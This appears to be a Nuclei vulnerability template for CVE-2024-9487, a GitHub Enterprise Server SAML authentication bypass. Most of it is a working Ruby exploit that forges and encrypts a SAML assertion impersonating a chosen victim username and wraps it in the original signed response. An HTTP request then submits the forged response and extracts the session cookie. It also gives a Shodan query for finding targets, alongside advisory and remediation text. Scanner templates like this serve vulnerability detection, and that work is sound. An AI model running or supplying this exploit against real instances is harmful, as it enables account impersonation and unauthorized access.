code:
- engine:
  - ruby
  source: "## Variable Usage:\n# username - Victim Github Username/Email to impersonate.\n\
    # SAMLResponse - SAML Response body.\n# metadata_url - IDP's Metadata URL.\n#\
    \ RelayState - Relay state associated with the SAML Response body.\n\nrequire\
    \ 'nokogiri'\nrequire 'openssl'\nrequire 'base64'\nrequire 'cgi'\nrequire 'open-uri'\n\
    saml_response_xml = Base64.decode64(CGI.unescape(ENV['SAMLResponse']))\nsaml_response\
    \ = Nokogiri::XML(saml_response_xml)\nnamespaces = {'ds' => 'http://www.w3.org/2000/09/xmldsig#','saml2'\
    \ => 'urn:oasis:names:tc:SAML:2.0:assertion','saml2p' => 'urn:oasis:names:tc:SAML:2.0:protocol'}\n\
    issuer = saml_response.xpath('//saml2:Issuer', namespaces).first.text\n\nmetadata_idp_url\
    \ = (ENV['metadata_url'])\n# URL to fetch the XML from\nurl = \"#{ENV['RootURL']}/saml/metadata\"\
    \nbegin\n  # Open the URL and read the XML\n  xml_content = URI.open(url,{ ssl_verify_mode:\
    \ OpenSSL::SSL::VERIFY_NONE }).read\n  xml_content_idp = URI.open(metadata_idp_url,{\
    \ ssl_verify_mode: OpenSSL::SSL::VERIFY_NONE }).read\n  # Parse the XML content\
    \ with Nokogiri\n  doc = Nokogiri::XML(xml_content)\n  idp_doc = Nokogiri::XML(xml_content_idp)\n\
    \n  # Extract the ds:X509Certificate\n  certificate = doc.at_xpath('//ds:X509Certificate',\
    \ 'ds' => 'http://www.w3.org/2000/09/xmldsig#')\n  audience = doc.at_xpath('//md:EntityDescriptor/@entityID').value\n\
    \  recipient = doc.at_xpath('//md:AssertionConsumerService/@Location').value\n\
    \  idp_cert = idp_doc.at_xpath('//ds:X509Certificate', 'ds' => 'http://www.w3.org/2000/09/xmldsig#')\n\
    \n\n  # Print the extracted certificate\n  if certificate\n    enc_cert = Base64.decode64(\"\
    #{certificate.text.strip}\")\n  else\n    puts \"ds:X509Certificate not found\
    \ in the XML.\"\n  end\n\nrescue OpenURI::HTTPError => e\n  puts \"HTTP Error:\
    \ #{e.message}\"\nrescue => e\n  puts \"An error occurred: #{e.message}\"\nend\n\
    signed_assertion_xml = <<-XML\n<saml2:Assertion ID=\"id1423912998721389200353112\"\
    \ IssueInstant=\"2024-10-13T09:53:46.851Z\" Version=\"2.0\" xmlns:saml2=\"urn:oasis:names:tc:SAML:2.0:assertion\"\
    ><saml2:Issuer Format=\"urn:oasis:names:tc:SAML:2.0:nameid-format:entity\" xmlns:saml2=\"\
    urn:oasis:names:tc:SAML:2.0:assertion\">issuer_replace</saml2:Issuer><ds:Signature\
    \ xmlns:ds=\"http://www.w3.org/2000/09/xmldsig#\"><ds:SignedInfo><ds:CanonicalizationMethod\
    \ Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/><ds:SignatureMethod Algorithm=\"\
    http://www.w3.org/2001/04/xmldsig-more#rsa-sha256\"/><ds:Reference URI=\"#id1423912998721389200353112\"\
    ><ds:Transforms><ds:Transform Algorithm=\"http://www.w3.org/2000/09/xmldsig#enveloped-signature\"\
    /><ds:Transform Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/></ds:Transforms><ds:DigestMethod\
    \ Algorithm=\"http://www.w3.org/2001/04/xmlenc#sha256\"/><ds:DigestValue>2n9HGB3mHU+gxo8DJrIw0MwT/Gs7/agpmo+C1sb7mtU=</ds:DigestValue></ds:Reference></ds:SignedInfo><ds:SignatureValue>OYOIw4wMFxm3OaG/n7YbQxcWKAFDmUjD33WIQJ3VgdsWdfV141v34AcV0tQ3A5dh9vWsM7/Kn3D0HETJzylJUaI4HhWWkNHrGpPX07Tjd0Yk7y9cD3+AzjIIsYlLGtpHFQ6jNAIzq4BumR+sb0ERQaG7IQqxgkCRY49YFtcJryxwjsgu/LD4gI7wOLdWh2cnZgReH5s9hXzyXaRoziUNdSv5McZx/T3VV76qGE2GZbQUGnBm9jwHjGriedi1PksKZxxcKdsumXk20i+fWEU8ueQJYm1mIHQa5bn2AVgE8D1grOYlhAOgjV8ByXZB0hC0Zkrgth9h1ij9rY9yBRxPVw==</ds:SignatureValue><ds:KeyInfo><ds:X509Data><ds:X509Certificate>cert_replace</ds:X509Certificate></ds:X509Data></ds:KeyInfo></ds:Signature><saml2:Subject\
    \ xmlns:saml2=\"urn:oasis:names:tc:SAML:2.0:assertion\"><saml2:NameID Format=\"\
    urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified\">user_replace</saml2:NameID><saml2:SubjectConfirmation\
    \ Method=\"urn:oasis:names:tc:SAML:2.0:cm:bearer\"><saml2:SubjectConfirmationData\
    \ Recipient=\"recipient_replace\"/></saml2:SubjectConfirmation></saml2:Subject><saml2:Conditions\
    \ xmlns:saml2=\"urn:oasis:names:tc:SAML:2.0:assertion\"><saml2:AudienceRestriction><saml2:Audience>audience_replace</saml2:Audience></saml2:AudienceRestriction></saml2:Conditions><saml2:AuthnStatement\
    \ AuthnInstant=\"2024-10-13T09:27:23.840Z\" xmlns:saml2=\"urn:oasis:names:tc:SAML:2.0:assertion\"\
    ><saml2:AuthnContext><saml2:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml2:AuthnContextClassRef></saml2:AuthnContext></saml2:AuthnStatement><saml2:AttributeStatement><saml2:Attribute\
    \ Name=\"emails\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:unspecified\"\
    ><saml2:AttributeValue xmlns:xs=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"\
    http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\">user_replace</saml2:AttributeValue></saml2:Attribute></saml2:AttributeStatement></saml2:Assertion>\n\
    XML\n\nsigned_assertion_xml = signed_assertion_xml.gsub \"cert_replace\", idp_cert\n\
    doc = Nokogiri::XML(signed_assertion_xml)\n\nsigned_assertion_xml = doc.to_xml(:indent\
    \ => 0, :save_with => Nokogiri::XML::Node::SaveOptions::AS_XML)\n\ncert = enc_cert\n\
    cert = OpenSSL::X509::Certificate.new(cert)\npublic_key = cert.public_key\n\n\
    # Encrypt the signed assertion node using AES and RSA for key wrapping\ndef encrypt_assertion(assertion_node,\
    \ rsa_public_key)\n  # Create a random AES key for encrypting the data\n  aes_key\
    \ = OpenSSL::Cipher.new('AES-256-CBC').random_key\n\n  # Encrypt the signed assertion\
    \ (as an XML string)\n  cipher = OpenSSL::Cipher.new('AES-256-CBC')\n  cipher.encrypt\n\
    \  cipher.key = aes_key\n\n  encrypted_data = cipher.update(assertion_node) +\
    \ cipher.final\n\n  # Encrypt the AES key using the RSA public key\n  encrypted_aes_key\
    \ = rsa_public_key.public_encrypt(aes_key, 4)\n\n\n  # Base64 encode both the\
    \ encrypted data and the encrypted AES key\n  encrypted_data_b64 = Base64.encode64(encrypted_data)\n\
    \  encrypted_aes_key_b64 = Base64.encode64(encrypted_aes_key)\n  encrypted_assertion_xml\
    \ = <<-XML\n      <saml:EncryptedAssertion xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\"\
    >\n        <xenc:EncryptedData xmlns:xenc=\"http://www.w3.org/2001/04/xmlenc#\"\
    >\n          <xenc:EncryptionMethod Algorithm=\"http://www.w3.org/2001/04/xmlenc#aes256-cbc\"\
    />\n          <ds:KeyInfo xmlns:ds=\"http://www.w3.org/2000/09/xmldsig#\">\n \
    \           <xenc:EncryptedKey>\n              <xenc:EncryptionMethod Algorithm=\"\
    http://www.w3.org/2001/04/xmlenc#rsa-oaep-mgf1p\"/>\n              <xenc:CipherData>\n\
    \                <xenc:CipherValue>#{encrypted_aes_key_b64}</xenc:CipherValue>\n\
    \              </xenc:CipherData>\n            </xenc:EncryptedKey>\n        \
    \  </ds:KeyInfo>\n          <xenc:CipherData>\n            <xenc:CipherValue>#{encrypted_data_b64}</xenc:CipherValue>\n\
    \          </xenc:CipherData>\n        </xenc:EncryptedData>\n      </saml:EncryptedAssertion>\n\
    \      XML\n\n  Nokogiri::XML(encrypted_assertion_xml)\nend\n\n# Parse the signed\
    \ assertion into Nokogiri XML document\ndoc = Nokogiri::XML(signed_assertion_xml)\n\
    assertion_node = doc.at('//saml2:Assertion', namespaces)\nassertion_node_str=\
    \ assertion_node.to_xml(:indent => 0, :save_with => Nokogiri::XML::Node::SaveOptions::AS_XML)\n\
    assertion_node_str = assertion_node_str.gsub! \"user_replace\", \"#{ENV['username']}\"\
    \nassertion_node_str = assertion_node_str.gsub! \"issuer_replace\", issuer\nassertion_node_str\
    \ = assertion_node_str.gsub! \"recipient_replace\", recipient\nassertion_node_str\
    \ = assertion_node_str.gsub! \"audience_replace\", audience\nassertion_node_1\
    \ = Nokogiri::XML(assertion_node_str)\nassertion_node_dup = assertion_node_1.dup\n\
    assertion_node_dup.at_xpath(\"//ds:Signature\", namespaces).remove\n\nassertion_node_dup.xpath('//text()').each\
    \ do |text_node|\n  text_node.content = text_node.text.strip\nend\n\ncanonical_xml\
    \ = assertion_node_dup.canonicalize(\nNokogiri::XML::XML_C14N_EXCLUSIVE_1_0,\n\
    [], # InclusiveNamespaces PrefixList\nfalse # WithComments\n)\n\n# Compute the\
    \ SHA-256 Digest\ndigest = OpenSSL::Digest::SHA256.digest(canonical_xml)\ndigest_base64\
    \ = Base64.encode64(digest).strip\nassertion_node_1.at_xpath(\"//ds:DigestValue\"\
    , namespaces).content = digest_base64\nfinal_assertion_node_str = assertion_node_1.to_xml(:indent\
    \ => 0, :save_with => Nokogiri::XML::Node::SaveOptions::AS_XML)\nencrypted_assertion_node\
    \ = encrypt_assertion(\"padinggggggggggg\"+final_assertion_node_str, public_key)\n\
    encrypted_assertion_node_str = encrypted_assertion_node.to_xml\n\n#create new\
    \ saml doc\n\nsaml_resp_node = saml_response.at('/saml2p:Response', namespaces)\n\
    saml_resp_sign_node = saml_response.at('/saml2p:Response/ds:Signature', namespaces)\n\
    saml_resp_sign_key_node = saml_response.at('/saml2p:Response/ds:Signature/ds:KeyInfo',\
    \ namespaces)\nobject_node = Nokogiri::XML::Node.new(\"Object\", saml_resp_sign_node)\n\
    object_node.namespace = saml_resp_sign_node.namespace\nobject_node.add_child(saml_resp_node.dup)\n\
    saml_resp_sign_key_node.add_next_sibling(object_node)\nencrypted_assertion_node\
    \ = Nokogiri::XML(encrypted_assertion_node_str)\nencrypted_assertion_node1 = encrypted_assertion_node.at_xpath('//saml2:EncryptedAssertion',\
    \ namespaces )\nsaml_response.at_xpath('/saml2p:Response/saml2:EncryptedAssertion',\
    \ namespaces).replace(encrypted_assertion_node1)\nsaml_resp_node['ID'] = saml_resp_node['ID'][0..-3]+\"\
    ae\"\nputs CGI.escape(Base64.strict_encode64(saml_response.to_xml(:indent => 0,\
    \ :save_with => Nokogiri::XML::Node::SaveOptions::AS_XML)))\n"
http:
- extractors:
  - kval:
    - user_session
    type: kval
  matchers:
  - condition: and
    dsl:
    - contains(header,"dotcom_user")
    - status_code == 302
    type: dsl
  raw:
  - 'POST /saml/consume HTTP/1.1

    Host: {{Hostname}}

    Cookie: saml_csrf_token={{RelayState}}; saml_csrf_token_legacy={{RelayState}};

    Content-Type: application/x-www-form-urlencoded


    RelayState={{RelayState}}&SAMLResponse={{code_response}}

    '
id: CVE-2024-9487
info:
  author: iamnoooob,rootxharsh,pdresearch
  classification:
    epss-percentile: 0.9796
    epss-score: 0.55491
  description: 'An improper verification of cryptographic signature vulnerability
    was identified in GitHub Enterprise Server that allowed SAML SSO authentication
    to be bypassed resulting in unauthorized provisioning of users and access to the
    instance. Exploitation required the encrypted assertions feature to be enabled,
    and the attacker would require direct network access as well as a signed SAML
    response or metadata document. This vulnerability affected all versions of GitHub
    Enterprise Server prior to 3.15 and was fixed in versions 3.11.16, 3.12.10, 3.13.5,
    and 3.14.2. This vulnerability was reported via the GitHub Bug Bounty program.

    '
  impact: 'Unauthenticated attackers can bypass SAML SSO authentication through crafted
    SAML responses, enabling unauthorized user provisioning and instance access on
    GitHub Enterprise Server.

    '
  metadata:
    shodan-query: title:"GitHub Enterprise"
    verified: true
  name: GitHub Enterprise - SAML Authentication Bypass
  reference:
  - https://projectdiscovery.io/blog/github-enterprise-saml-authentication-bypass
  - https://github.com/advisories/GHSA-g83h-4727-5rpv
  remediation: 'Upgrade GitHub Enterprise Server to version 3.11.16, 3.12.10, 3.13.5,
    or 3.14.2 or later that properly verifies cryptographic signatures.

    '
  severity: critical
  tags: cve,cve2024,github,ghe,saml,auth-bypass,sso,vuln
